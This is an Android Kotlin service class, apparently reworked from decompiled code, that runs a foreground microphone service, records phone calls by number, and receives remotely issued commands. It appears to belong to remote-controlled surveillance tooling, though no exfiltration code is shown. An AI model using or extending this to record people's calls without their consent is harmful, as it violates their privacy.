package com.hawkshaw.library.features.media

import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo // Required for FOREGROUND_SERVICE_TYPE_MICROPHONE
import android.os.Build
import android.os.IBinder
import android.util.Log // Added for logging
import androidx.annotation.RequiresApi
import com.hawkshaw.library.App
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt
import com.hawkshaw.library.features.telephony.CallRecorder // Ensure this is the correct import
import com.hawkshaw.library.ktextensions.safeLaunch
import com.hawkshaw.library.logger.Logger
import com.hawkshaw.library.utils.NotificationKt
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job

class MediaService : Service() {
    private var callRecorder: CallRecorder? = null
    private val serviceScope = CoroutineScope(Dispatchers.Default + Job())

    companion object {
        private const val TAG = "MediaService"

        @RequiresApi(Build.VERSION_CODES.O)
        fun handleCallRecorderRequest(intent: Intent) {
            Log.d(TAG, "[DEBUG] Companion.handleCallRecorderRequest called with intent: $intent")
            val context = App.getContext()
            val serviceIntent = Intent(context, MediaService::class.java).apply {
                putExtras(intent)
            }
            Log.d(TAG, "[DEBUG] Companion.handleCallRecorderRequest: Starting foreground service with intent: $serviceIntent, extras: ${serviceIntent.extras}")
            context.startForegroundService(serviceIntent)
        }

        @RequiresApi(Build.VERSION_CODES.O)
        fun handleMediaCommand(command: Command) {
            Log.d(TAG, "[DEBUG] Companion.handleMediaCommand called with command: $command")
            val context = App.getContext()
            // val encodedCommand = ContentNegotiationInterceptorKt.json.encodeToString(Command.serializer(), command) // Redundant: command is encoded below
            val serviceIntent = Intent(context, MediaService::class.java).apply {
                putExtra("type", "HandleMediaCommand")
                putExtra("command", ContentNegotiationInterceptorKt.json.encodeToString(Command.serializer(), command))
            }
            Log.d(TAG, "[DEBUG] Companion.handleMediaCommand: Starting foreground service with intent: $serviceIntent, extras: ${serviceIntent.extras}")
            context.startForegroundService(serviceIntent)
        }

        fun stopService() {
            Log.d(TAG, "[DEBUG] Companion.stopService called")
            val context = App.getContext()
            context.stopService(Intent(context, MediaService::class.java))
        }
    }

    override fun onDestroy() {
        Log.d(TAG, "[DEBUG] onDestroy called")
        super.onDestroy()
        // Ensure CallRecorder is stopped and cleaned up if service is destroyed unexpectedly
        callRecorder?.stopRecordingInstance() // This will also set CallRecorder.Companion.isRecording to false
        CallRecorder.Companion.isRecording.set(false) // Explicitly set again to be sure
        CallRecorder.Companion.currentRecordingNumber = null
        callRecorder = null
        stopForeground(true)
        Logger.v(TAG, "onDestroy", false, 4, null)
        Log.d(TAG, "[DEBUG] onDestroy: Service destroyed, foreground stopped, CallRecorder state cleaned.")
    }

    @RequiresApi(Build.VERSION_CODES.R)
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "[DEBUG] onStartCommand called with intent: $intent, flags: $flags, startId: $startId")
        Logger.v(TAG, "onStartCommand", false, 4, null)
        super.onStartCommand(intent, flags, startId)

        Log.d(TAG, "[DEBUG] onStartCommand: Starting foreground service with notification.")
        val notification = NotificationKt.getNotification().build()
        val notificationId = 1 // Or your specific notification ID

        startForeground(notificationId, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
        Log.d(TAG, "[DEBUG] onStartCommand: Called startForeground with FOREGROUND_SERVICE_TYPE_MICROPHONE for API ${Build.VERSION.SDK_INT}.")

        intent?.getStringExtra("command")?.let { commandStr ->
            Log.d(TAG, "[DEBUG] onStartCommand: Received command string: $commandStr")
            serviceScope.safeLaunch {
                Log.d(TAG, "[DEBUG] onStartCommand: Decoding command string in serviceScope.")
                val command = ContentNegotiationInterceptorKt.json.decodeFromString(Command.serializer(), commandStr)
                Log.d(TAG, "[DEBUG] onStartCommand: Decoded command: $command. Calling handleMediaCommand (instance).")
                handleMediaCommand(command)
            }
        }

        val intentType = intent?.getStringExtra("type")
        Log.d(TAG, "[DEBUG] onStartCommand: Intent type: $intentType")
        when (intentType) {
            "StartCallRecording" -> {
                Log.d(TAG, "[DEBUG] onStartCommand: Case 'StartCallRecording'")
                val phoneNumber = intent.getStringExtra("phone_number")
                Log.d(TAG, "[DEBUG] onStartCommand: Phone number for call recording: $phoneNumber. Checking CallRecorder.Companion.isRecording: ${CallRecorder.Companion.isRecording.get()}")
                
                if (CallRecorder.Companion.isRecording.get()) { // Check the authoritative flag
                    if (phoneNumber != null) {
                        Log.d(TAG, "[DEBUG] onStartCommand: CallRecorder.Companion.isRecording is true. Initializing CallRecorder for $phoneNumber.")
                        // Ensure only one CallRecorder instance is active for this service instance
                        if (callRecorder == null) {
                           callRecorder = CallRecorder(this)
                        }
                        callRecorder?.apply {
                            Log.d(TAG, "[DEBUG] onStartCommand: Starting call recording instance for $phoneNumber.")
                            startRecordingInstance(phoneNumber)
                        }
                    } else {
                        Log.e(TAG, "[DEBUG] onStartCommand: Attempted to start call recording with a null phone number, though CallRecorder.Companion.isRecording was true.")
                        Logger.e(TAG, "Attempted to start call recording without a phone number.", null, false, 12, null)
                        CallRecorder.Companion.isRecording.set(false) // Correct state if we can't proceed
                    }
                } else {
                    Log.w(TAG, "[DEBUG] onStartCommand (StartCallRecording): CallRecorder.Companion.isRecording is false. Call may have ended or state changed rapidly. Aborting start.")
                    // Do not attempt to start recording if the companion flag is already false.
                    // This is the core fix for the race condition.
                }
            }
            "StopCallRecording" -> {
                Log.d(TAG, "[DEBUG] onStartCommand: Case 'StopCallRecording'")
                callRecorder?.let {
                    Log.d(TAG, "[DEBUG] onStartCommand: Stopping call recording instance.")
                    it.stopRecordingInstance() // This will also set CallRecorder.Companion.isRecording to false in its finally block
                } ?: Log.d(TAG, "[DEBUG] onStartCommand: CallRecorder instance was null, nothing to stop via instance.")
                
                // Explicitly ensure the global state is updated regardless of instance existence
                if (CallRecorder.Companion.isRecording.getAndSet(false)) {
                     Log.d(TAG, "[DEBUG] onStartCommand (StopCallRecording): Set CallRecorder.Companion.isRecording to false.")
                } else {
                     Log.d(TAG, "[DEBUG] onStartCommand (StopCallRecording): CallRecorder.Companion.isRecording was already false.")
                }
                CallRecorder.Companion.currentRecordingNumber = null
                Log.d(TAG, "[DEBUG] onStartCommand: Set CallRecorder.Companion.currentRecordingNumber to null.")

                callRecorder = null // Release the instance
                Log.d(TAG, "[DEBUG] onStartCommand: Local callRecorder instance set to null. Stopping self.")
                stopSelf() // Stop the service after recording is handled
            }
            "HandleMediaCommand" -> {
                 Log.d(TAG, "[DEBUG] onStartCommand: Case 'HandleMediaCommand' (processing via command extra).")
            }
            null -> {
                Log.d(TAG, "[DEBUG] onStartCommand: Intent type is null.")
            }
            else -> {
                 Log.w(TAG, "[DEBUG] onStartCommand: Unknown intent type: $intentType")
            }
        }
        Log.d(TAG, "[DEBUG] onStartCommand: Returning START_NOT_STICKY.")
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        Log.d(TAG, "[DEBUG] onBind called with intent: $intent. Returning null.")
        return null
    }

    private fun handleMediaCommand(command: Command) {
        Log.d(TAG, "[DEBUG] Instance.handleMediaCommand called with command: $command")
        Logger.d(TAG, "Handling media command: ${command.type}", false, 4, null)
    }
}
